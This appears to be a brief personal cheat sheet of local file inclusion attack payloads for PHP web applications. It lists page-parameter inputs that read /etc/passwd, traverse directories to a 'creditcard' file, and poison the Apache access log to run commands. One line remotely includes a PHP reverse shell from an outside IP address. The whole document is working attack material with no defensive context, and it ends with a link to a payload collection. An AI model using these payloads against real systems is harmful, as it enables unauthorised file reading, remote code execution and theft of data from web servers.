# LFI Basic

## Basic LFI

```php
?page=home.html
?page=/etc/passwd
```

## LFI using Directory Traversal

```php
?page=../creditcard
?page=../../../../etc/passwd
```

## RCE From LFI

for that we need to be able to read the log file

```php
?page=/var/log/apache2/access.log
```

```php
?page=http://10.8.2.244/php-reverse-shell.php
```

```php
?page=/var/log/apache2/access.log&cmd=[your command]
```

go here :
<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion>